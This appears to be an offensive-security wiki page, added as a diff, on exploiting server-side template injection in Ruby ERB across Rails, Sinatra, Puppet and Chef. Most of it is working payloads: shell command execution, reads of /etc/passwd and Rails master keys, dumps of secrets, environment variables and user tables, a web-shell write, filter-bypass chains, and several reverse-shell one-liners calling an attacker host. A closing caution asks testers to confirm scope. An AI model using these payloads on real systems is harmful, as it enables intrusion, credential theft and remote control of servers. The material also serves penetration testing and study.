@@ -1,0 +1,241 @@
+---
+title: ERB (Ruby - Rails, Sinatra, Puppet)
+description: SSTI exploitation in ERB - eval and system via Ruby kernel, payloads for Rails admin sinks and Puppet manifests.
+mitre: [T1190, T1059.006]
+d3fend: [D3-EAL]
+impact: [ServerSideEval, RCE, FileRead]
+sidebar:
+  order: 7
+  label: ERB
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+ERB evaluates arbitrary Ruby. There's no sandbox layer to escape - `<%= ... %>` is a Ruby expression, full stop. If you can reach ERB rendering with user input, you have RCE.
+
+```
+# Confirm ERB
+<%= 7*7 %>                                   # → 49
+<%= File %>                                  # → File (class object)
+
+# RCE - direct
+<%= `id` %>                                  # backtick exec
+<%= system('id') %>                          # → true (with side-effect to stdout)
+<%= IO.popen('id').read %>                   # output as string
+
+# File read
+<%= File.read('/etc/passwd') %>
+```
+
+Success indicator: command output or file contents in response. ERB SSTI is the most direct of any template engine - minimal indirection between bug and shell.
+
+## Where this engine lives
+
+- **Ruby on Rails** - `.html.erb` views. Sinks are anywhere `ERB.new(user_input).result` runs, most commonly in admin "email template" or "report builder" features.
+- **Sinatra** - same ERB usage, smaller app surface.
+- **Puppet** - `.erb` files in manifests are templates. RCE through Puppet templates is a serious privesc path on misconfigured Puppet servers.
+- **Chef** - `template` resources use ERB. RCE through chef-cookbook templates.
+- **Vagrant / Logstash** - both bundle ERB for configuration templating.
+- **Custom Ruby apps** - anything embedding `ERB.new` with externally-influenced input.
+
+## Step 1 - Confirm and orient
+
+```
+<%= 7*7 %>                       # → 49        confirms template eval
+<%= File %>                      # → File      confirms Ruby-side access (returns class repr)
+<%= RUBY_VERSION %>              # returns Ruby version string - confirms ERB
+```
+
+If `<%= 7*7 %>` returns `49`, you have ERB and full Ruby evaluation. There's no sandbox path to worry about - ERB does not have one. Move to step 2.
+
+## Step 2 - RCE paths
+
+Ruby gives several ways to run commands. Any of them works; the choice depends on what the application does with the output.
+
+### Path A - Backticks
+
+```
+<%= `id` %>
+<%= `cat /etc/passwd` %>
+<%= `uname -a` %>
+```
+
+Backticks execute the command and return stdout as a string. The cleanest output path.
+
+### Path B - `system`
+
+```
+<%= system('id') %>                          # returns true/false (success flag), output goes to stdout
+<%= system('id', out: $stdout) %>            # explicit
+```
+
+`system` is useful when you want side effects (e.g. writing a file) and don't care about reflecting output.
+
+### Path C - `IO.popen`
+
+```
+<%= IO.popen('id').read %>
+<%= IO.popen(['id']).read %>                 # array form - bypasses shell metachar filters
+```
+
+### Path D - `Process.spawn` / `exec`
+
+```
+<%= Process.spawn('id') %>                   # returns PID, async
+<%= exec('id') %>                            # replaces the Ruby process - usually destructive, avoid
+```
+
+`Process.spawn` is useful when you need to fire-and-forget; `exec` is rarely what you want because it kills the application worker.
+
+### Path E - `%x{...}`
+
+```
+<%= %x{id} %>
+```
+
+Equivalent to backticks. Useful when backticks are filtered specifically.
+
+## Step 3 - Loot before escalating
+
+```
+# Rails environment & config
+<%= Rails.env %>                             # production / development / test
+<%= Rails.application.secrets %>             # full secrets hash
+<%= Rails.application.credentials %>         # Rails 5.2+ credentials
+<%= ENV.to_h %>                              # all environment variables
+
+# Active Record dump
+<%= User.first.to_json %>
+<%= ActiveRecord::Base.connection.execute("SELECT * FROM users").to_a %>
+
+# File system
+<%= Dir.entries('/') %>
+<%= File.read('config/master.key') %>        # decrypts Rails credentials
+
+# Ruby session
+<%= $LOAD_PATH %>                            # gem paths - reveals app structure
+<%= Gem.loaded_specs.keys %>                 # all loaded gems
+```
+
+`Rails.application.secrets` on Rails 4.x-5.1 and `Rails.application.credentials` on 5.2+ contain `secret_key_base`, database passwords, third-party API keys. Often sufficient on its own.
+
+For Rails 5.2+, the encrypted credentials at `config/credentials.yml.enc` are useless without `config/master.key` (or `RAILS_MASTER_KEY` env var) - but ERB SSTI can read both:
+
+```
+<%= File.read('config/master.key') %>
+```
+
+Then decrypt offline.
+
+## Step 4 - File operations
+
+```
+# Read
+<%= File.read('/etc/passwd') %>
+<%= File.readlines('/etc/passwd') %>
+
+# Write (creates web shell)
+<%= File.write('/tmp/x', '<%= `id` %>') %>
+
+# Append
+<%= File.open('/tmp/x', 'a') { |f| f.puts('append') } %>
+
+# Directory enumeration
+<%= Dir.glob('/etc/*') %>
+<%= Dir.entries('/var/www') %>
+```
+
+## Step 5 - Reverse shell
+
+Ruby's socket library is always available:
+
+```
+<%= require 'socket'; s=TCPSocket.new('<LHOST>',<LPORT>); while(cmd=s.gets); IO.popen(cmd,'r'){|io| s.print io.read}; end %>
+```
+
+One-liner with fork to keep the request from blocking:
+
+```
+<%= Process.fork{require 'socket'; s=TCPSocket.new('<LHOST>',<LPORT>); STDIN.reopen(s); STDOUT.reopen(s); STDERR.reopen(s); exec '/bin/sh -i'} %>
+```
+
+Standard `bash -i` via system also works:
+
+```
+<%= system('bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"') %>
+```
+
+## Step 6 - Puppet-specific RCE
+
+Puppet manifests use ERB for template rendering. Sinks are anywhere user input flows into a `template()` call or an `.erb` file's variable expansion. Example malicious template content (placed via any Puppet-template authoring feature):
+
+```erb
+<%= `id` %>
+```
+
+When Puppet compiles, the template renders on the Puppet *server* - which usually runs as root. Practical sinks: Puppet Enterprise's web console template editor, Hiera data files that include `%{...}` interpolations, ENC scripts.
+
+## Statement vs expression syntax
+
+ERB has two delimiter pairs:
+
+```
+<%= expression %>                            # evaluates and inserts result into output
+<% statement %>                              # evaluates but does NOT insert result
+```
+
+Both execute Ruby. The difference is whether output appears. For RCE, prefer `<%=` so you can see the result; if `<%=` is filtered but `<%` isn't, use:
+
+```
+<% IO.popen('id > /tmp/out') %>
+```
+
+Then read `/tmp/out` via a second request.
+
+A third form, `<%- ... -%>`, suppresses leading/trailing whitespace - useful for filter bypass:
+
+```
+<%- system('id') -%>
+```
+
+## Filter-aware variants
+
+```
+# Method call via send
+<%= "".send(:eval, "`id`") %>
+
+# Object.const_get for symbol-based access
+<%= Object.const_get('Kernel').send('`', 'id') %>
+
+# Through Method binding
+<%= method(:eval).call("`id`") %>
+
+# When <%= is filtered
+<% out = `id`; raise out %>                  # exception message contains output
+```
+
+ERB filters are usually very weak compared to other engines because Ruby is a deeply dynamic language - almost any chain of `send` / `eval` / `instance_eval` / `binding.eval` reaches command execution.
+
+## Detection-only payloads
+
+```
+<%= 7*7 %>                                   # eval probe
+<%= File %>                                  # ERB-specific (returns 'File' class repr)
+<%= RUBY_VERSION %>                          # returns Ruby version
+<%= Process.pid %>                           # returns process ID
+<%= Time.now %>                              # returns server time
+```
+
+`<%= File %>` is the cleanest "is this ERB?" probe - `File` is a Ruby class name with no analog in EJS/JSP/Razor. Returns the literal text `File` if ERB is rendering.
+
+## Notes
+
+- **ERB has no sandbox.** Unlike Jinja2, Twig, or Freemarker, there is no "safe mode" for ERB. Ruby applications that template untrusted input are accepting the risk by design. Some apps use **Liquid** instead (Shopify's restricted templating language) - Liquid has its own attack surface but is much more restrictive.
+- **Rails view templates** rarely take direct user input - the sink is usually a separate "template editor" feature in admin panels. The same template engine renders all views, so SSTI in any admin template gives RCE in the same process that renders public pages.
+- **Output encoding** - Rails wraps `<%= ... %>` output with HTML escaping by default. The Ruby code still executes; only the *result string* is escaped before insertion. So `<%= system('id') %>` returns `true` (which renders as `true`) but `id` runs unimpeded. Use file-write paths or reverse shells when you can't see output directly.
+- **Trim modes** - ERB.new accepts `<>`, `-`, `%`, `>` as trim modes. These affect whitespace handling but not the Ruby execution. They don't impede payloads.
+
+<Aside type="caution">
+ERB SSTI is the lowest-friction RCE in this entire section. There's no sandbox, no escape sequence, no class graph to walk - `<%= system('id') %>` is the whole exploit. Confirm scope before going past `7*7`. The configuration-dump and file-read demonstrations are sufficient for almost any report.
+</Aside>
